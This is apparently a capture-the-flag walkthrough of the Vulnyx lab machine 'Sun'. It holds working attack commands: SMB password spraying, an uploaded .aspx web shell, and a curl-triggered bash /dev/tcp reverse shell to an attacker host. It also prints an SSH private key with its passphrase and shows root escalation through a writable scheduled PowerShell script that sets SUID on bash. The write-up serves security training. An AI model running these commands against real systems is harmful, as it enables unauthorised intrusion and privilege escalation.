# Vulnyx: Sun

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `nxc` · `rpcclient` · `smbclient` · `curl` · `pspy64` |
| **Tags** | `#SIDEnumeration` `#PasswordSpraying` `#FileUpload` `#RCE` `#ScheduledTask` `#SUID` |
| **URL** | https://vulnyx.com/machines/ |

Despite being a Linux box, this one runs a .NET-flavored stack — an `.aspx` web app on port 8080 and, later, a PowerShell script executed as root. RPC's SID enumeration leaks a username, sprayed successfully against SMB. That account's own SMB share is used to upload an `.aspx` web shell, served directly by the app on 8080. From there, an SSH key with a passphrase hint conveniently left in a file gets a proper shell, and a writable PowerShell script triggered by a scheduled task finishes the job.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn sun.nyx

PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 64
139/tcp  open  netbios-ssn  syn-ack ttl 64
445/tcp  open  microsoft-ds syn-ack ttl 64
8080/tcp open  http-proxy   syn-ack ttl 64
MAC Address: 08:00:27:07:78:BF (Oracle VirtualBox virtual NIC)
```

Five ports come back open: **22 (SSH)**, **80 (HTTP)**, **139/445 (SMB)**, and **8080**. A version/script scan against all of them fills in the details:

```bash
$ sudo nmap -p 22,80,139,445,8080 -sCV sun.nyx

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Sun
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
8080/tcp open  http    nginx 1.22.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.22.1
|_http-title: Sun
MAC Address: 08:00:27:07:78:BF (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-08-22T13:13:07
|_  start_date: N/A
|_clock-skew: -1s
|_nbstat: NetBIOS name: SUN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

### Web Enumeration

Both HTTP ports serve the same "Sun" landing page with nothing immediately actionable:

```
http://sun.nyx/
http://sun.nyx:8080/
```

<img src="../Images/sun/Pasted image 20260822155028.png"/>

### SMB Enumeration

A null session is allowed, and listing shares turns up a `nobody` share described as a "File Upload Path":

```bash
$ nxc smb sun.nyx
SMB         <IP_Victim>      445    SUN              [*] Unix - Samba (name:SUN) (domain:SUN) (signing:False) (SMBv1:None) (Null Auth:True)
```

```bash
$ nxc smb sun.nyx -u '' -p '' --shares
SMB         <IP_Victim>      445    SUN              [*] Unix - Samba (name:SUN) (domain:SUN) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         <IP_Victim>      445    SUN              [+] SUN\:
SMB         <IP_Victim>      445    SUN              [*] Enumerated shares
SMB         <IP_Victim>      445    SUN              Share           Permissions     Remark
SMB         <IP_Victim>      445    SUN              -----           -----------     ------
SMB         <IP_Victim>      445    SUN              print$                          Printer Drivers
SMB         <IP_Victim>      445    SUN              IPC$                            IPC Service (Samba 4.17.12-Debian)
SMB         <IP_Victim>      445    SUN              nobody                          File Upload Path
```

### RPC User Enumeration

The same SID brute-force approach used elsewhere in this set — starting from `root`'s own SID prefix, then walking a range of RIDs — leaks a valid username:

```bash
$ rpcclient -W '' -U ''%'' sun.nyx -c 'lookupnames root'
root S-1-22-1-0 (User: 1)
```

```bash
$ for i in $(seq 1000 1005); do
  bash -c "rpcclient -W '' -U ''%'' sun.nyx -c 'lookupsids S-1-22-1-$i'"
done
S-1-22-1-1000 Unix User\punt4n0 (1)
S-1-22-1-1001 Unix User\1001 (1)
S-1-22-1-1002 Unix User\1002 (1)
S-1-22-1-1003 Unix User\1003 (1)
S-1-22-1-1004 Unix User\1004 (1)
S-1-22-1-1005 Unix User\1005 (1)
```

> **User:** `punt4n0`

## Initial Access

### Password Spraying via SMB

With a valid username in hand, the password is sprayed from `rockyou.txt` (re-encoded to UTF-8 first, so `nxc` doesn't choke on the original ISO-8859-1 bytes):

```bash
$ iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou-utf8.txt
$ nxc smb sun.nyx -u 'punt4n0' -p rockyou-utf8.txt
```

> **Credentials:** `punt4n0:sunday`

Re-listing shares with those credentials shows `punt4n0` now has a personal, writable share:

```bash
$ nxc smb sun.nyx -u 'punt4n0' -p 'sunday' --shares
SMB         <IP_Victim>      445    SUN              [*] Unix - Samba (name:SUN) (domain:SUN) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         <IP_Victim>      445    SUN              [+] SUN\punt4n0:sunday
SMB         <IP_Victim>      445    SUN              [*] Enumerated shares
SMB         <IP_Victim>      445    SUN              Share           Permissions     Remark
SMB         <IP_Victim>      445    SUN              -----           -----------     ------
SMB         <IP_Victim>      445    SUN              print$          READ            Printer Drivers
SMB         <IP_Victim>      445    SUN              IPC$                            IPC Service (Samba 4.17.12-Debian)
SMB         <IP_Victim>      445    SUN              punt4n0         READ,WRITE      File Upload Path
```

### SMB Share Upload

`punt4n0`'s personal share is writable with their own credentials, so an `.aspx` web shell is dropped into it:

```bash
$ smbclient \\\\sun.nyx\\punt4n0 -U 'punt4n0%sunday'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Aug 22 09:15:57 2026
  ..                                  D        0  Mon Apr  1 12:43:11 2024
  index.html                          N      263  Tue Apr  2 04:54:36 2024
  sun.jpg                             N    98346  Tue Apr  2 04:49:44 2024

                19480400 blocks of size 1024. 15626972 blocks available
smb: \> put webshell.aspx
putting file webshell.aspx as \webshell.aspx (38.9 kB/s) (average 38.9 kB/s)
```

### RCE via the Webshell

The app on port 8080 serves that same share's content — the uploaded `.aspx` file is directly reachable and executes:

```
view-source:http://sun.nyx:8080/webshell.aspx?cmd=id
```

<img src="../Images/sun/Pasted image 20260822155440.png"/>

The `cmd` parameter is used to fire a reverse shell:

```bash
$ curl "http://sun.nyx:8080/webshell.aspx?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<ATTACKER_IP>%2F<PORT>%200%3E%261"
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [sun.nyx] 49974
bash: no se puede establecer el grupo de proceso de terminal (412): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
punt4n0@sun:~$ id
uid=1000(punt4n0) gid=1000(punt4n0) groups=1000(punt4n0)
```

### Loot: SSH Key + a Passphrase Hint

`punt4n0`'s home holds an encrypted SSH private key and a `.remember_password` file:

```bash
punt4n0@sun:~$ ls -la /home/punt4n0
total 44
drwx------    5 punt4n0  punt4n0       4096 abr  2  2024 .
drwxr-xr-x    3 root     root          4096 abr  1  2024 ..
lrwxrwxrwx    1 root     root             9 nov 15  2023 .bash_history -> /dev/null
-rw-r--r--    1 punt4n0  punt4n0        220 nov 15  2023 .bash_logout
-rw-r--r--    1 punt4n0  punt4n0       3526 nov 15  2023 .bashrc
drwxr-xr-x    3 punt4n0  punt4n0       4096 abr  1  2024 .local
drwxr-xr-x    3 punt4n0  punt4n0       4096 abr  1  2024 .mono
-rw-r--r--    1 punt4n0  punt4n0        807 nov 15  2023 .profile
-rw-r--r--    1 punt4n0  punt4n0         17 abr  2  2024 .remember_password
-rw-r--r--    1 punt4n0  punt4n0         66 abr  1  2024 .selected_editor
drwx------    2 punt4n0  punt4n0       4096 abr  2  2024 .ssh
-r--------    1 punt4n0  punt4n0         33 abr  2  2024 user.txt
punt4n0@sun:~$ ls -l /home/punt4n0/.ssh
total 8
-rw-------    1 punt4n0  punt4n0        381 abr  2  2024 authorized_keys
-rw-------    1 punt4n0  punt4n0       1743 abr  2  2024 id_rsa
punt4n0@sun:~$ cat /home/punt4n0/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,FD3DF78C63F0690C

DRKk/RJcwYG3mZYGsRkm/n6pP0jJx1p2JnDOahgk/lzdKA2KyasSU1he7udFGlW9
N76coKMV4MKnT+tlPFA8BfMN2ncRHaJ7MxPt0UnAZiVHA7b2AjbrokEL0ceSUfvW
Jrx8lYvNHqJ4LPzNjzdD6QaBRE/AC4ODdr2vcoy7HzXodaxQXJSAlzbj1fRnBao+
iNSc2aqc7udG9YoDJ4BmijSjm1ybf4SIGMczN6GMgE7uz0CP4tOw7KGLNlLlUm1g
AcH0fgChEApyWe+/VT3+va46U98fmqiSHQLU/9io6c9/0ThGHlha0s1M8GewXqtl
qtD5J+L63aGeKAmLDRS1GELzH61C6OlqlRmbIax26FMff2PkmE+TMRBK8a3x+OrN
XaA/Nyk50rjZhfc0gwTNT/HAB8ZsbgPwrKHT90cXGufEgaRg+Y5bTa/tnuGGThqG
eHteHxvArF0jCVqQMT3yLsyVxfT6Ptxec+JH2gv7qS63ugl+9JMNKRoFIdlo2BVF
3R1Cf3Dm9/sA08VU6ET7FB9v039J3K7wib2KMIqMbI3aIQW/+0vHZ3vbwThoTRqq
7VZMBrBo7VeL1AkZu1IqbC14lIzSDKUDYl7HiiT27Aj7005YlCD00Z1214JzooyW
sPs1ly+JExhOUIvvO/Nb21/fx6yD4spYhB08XGuEZKjJkM/9r4nEEHmR4FztT2oQ
PTt4JBrk3uHMSZPMrH5uFdrR0tnFp+8e9YUHpNQ28ufVpdQazH9nFGy8ohDA9J+C
n1i9HoEl857+MqUNAFnMn9Qa+QTvWG/k7RgW2Uey/Pyw7TjwtAOjjCOTrjApZNL/
Oo3dkd2i5j7wEKnpd3TWrBbiyKxY8efUyEb/Q3UR8+vDDLPhkNbPCLGC6w7najQ3
O7pbvuMg/RPqgE5nyR/qp9XfatCo8qbPmqECRoydABJy+zmChoUgBgaedi3jOEpj
MT2GCaO2YGy3BVoqixtAC8/AoQxdFNum8VsFBfEQPUjMxTRqTTtOReBj0/+uMprc
KFOMXuMsSXQ+Ugi2Lhp4n9DF0WaKW7ALj9VwYmvHi1jQEqJ7tVVU7fWs5Qi2ac4r
0cUNJZxUBkTkz+mcfZHgi2DcdBrxGHoUGlbEK+T0xx76p9JzDUf8wVD+CqjTSAR5
cc6u7wiDuW+91LzBVI4bRIAI5qBbeoys+50lE8hIk47flVSIg84UqNE/6XXOQAi
UZ05Y9n8M/Tw9TKc8/Kaqa5JFZxPDjACb51898/IDSMljJKTraZQzPFfOu+NZgUQ
MHxp0UreQovHjcFyQR0aZD5mZi1Q5fyALchrRWxlmZ+2TZeBROnQgWQcnX5EzkpO
N1mSxOai7i+PqCv/v5yppDxwpRPK53/aq0t1ZUvkSFPSJHDRFwXIV9y305yxrAy
kAXZHr3tqlK+uKQJ3V5X7lj09RTZRdqRd9YTlk7Lx1jMscKMv/lN2php/Cy6kr5t
APAVfrKyYzanfvUFyxJxwfRL6Cb03fSgaNa5w7cYQXznjRNfvcCv2WzSaIf/lLOL
BC6eW46B/Jev3Lst9zWyN0Z6GLPqnfuqHd5eRn10Q+QHcYdb3lHYqA==
-----END RSA PRIVATE KEY-----
punt4n0@sun:~$ cat /home/punt4n0/.remember_password
Th3_p0w3r_0f_IIS
```

The key is passphrase-protected, and the hint file spells the passphrase out directly:

> **Passphrase:** `Th3_p0w3r_0f_IIS`

### Shell as punt4n0

The key and its passphrase give a proper, stable shell:

```bash
$ ssh punt4n0@sun.nyx -i id_rsa
punt4n0@sun:~$ id
uid=1000(punt4n0) gid=1000(punt4n0) grupos=1000(punt4n0)
punt4n0@sun:~$ ls -l /home/punt4n0/
total 4
-r--------    1 punt4n0  punt4n0         33 abr  2  2024 user.txt
punt4n0@sun:~$ cat /home/punt4n0/user.txt
3b16b996837f6e87ffb20ab19edb88b7
```

> **User flag:** `3b16b996837f6e87ffb20ab19edb88b7`

## Privilege Escalation

### A Writable PowerShell Script

`pspy` is uploaded over SSH to watch for scheduled tasks that a normal process listing wouldn't reveal:

```bash
$ scp -i ~/Vulnyx/Easy/Sun/id_rsa pspy64 punt4n0@sun.nyx:/tmp/
Enter passphrase for key '/home/kali/Vulnyx/Easy/Sun/id_rsa':
pspy64                                       100% 3032KB   7.0MB/s   00:00
```

```bash
punt4n0@sun:/tmp$ chmod +x pspy64
punt4n0@sun:/tmp$ ./pspy64
```

<img src="../Images/sun/Pasted image 20260822160003.png"/>

A search for writable files outside the noisy pseudo-filesystems turns up a root-owned script under `/opt`:

```bash
punt4n0@sun:~$ find / -writable 2>/dev/null | grep -v -i -E 'proc|sys|dev|run|home|var|tmp'
/opt/service.ps1
punt4n0@sun:~$ ls -l /opt/service.ps1
-rwxrw-rw-    1 root     root            97 abr  2  2024 /opt/service.ps1
punt4n0@sun:~$ cat /opt/service.ps1
$idOutput = id

$outputFilePath = "/dev/shm/out"

$idOutput | Out-File -FilePath $outputFilePath
```

Consistent with the box's `.NET`-flavored theming, `/opt/service.ps1` is a PowerShell script — run via PowerShell Core (`pwsh`), which is cross-platform and runs fine on Linux — triggered on a schedule and writable by the current user. Its contents are swapped to make `/bin/bash` SUID:

```bash
punt4n0@sun:~$ nano /opt/service.ps1
punt4n0@sun:~$ cat /opt/service.ps1
$idOutput = chmod +s /bin/bash

$outputFilePath = "/dev/shm/out"

$idOutput | Out-File -FilePath $outputFilePath
```

Once the scheduled task runs the modified script as root, `/bin/bash` gains the SUID bit:

```bash
punt4n0@sun:~$ ls -l /bin/bash
-rwsr-sr-x    1 root     root       1265648 abr 23  2023 /bin/bash
```

```bash
punt4n0@sun:~$ /bin/bash -p
bash-5.2# id
uid=1000(punt4n0) gid=1000(punt4n0) euid=0(root) egid=0(root) grupos=0(root),1000(punt4n0)
bash-5.2# ls -l /root
total 4
-r--------    1 root     root            33 abr  2  2024 root.txt
bash-5.2# cat /root/root.txt
e1e7f5e01538acad8c272a5da450f9f6
```

> **Root flag:** `e1e7f5e01538acad8c272a5da450f9f6`

## Takeaways

- A themed box can still run technology you wouldn't expect from its OS — a Linux target with a full `.aspx`/PowerShell stack is a reminder to enumerate what's actually running rather than assuming based on the OS alone.
- A personal SMB share writable by a valid low-privilege account is a direct upload path if a web app happens to serve the same storage — worth checking whether SMB shares and web content overlap on any target running both services.
- A scheduled script is only as safe as its own file permissions, regardless of what language it's written in — PowerShell run via `pwsh` on Linux is just as exploitable through a writable file as a bash script would be.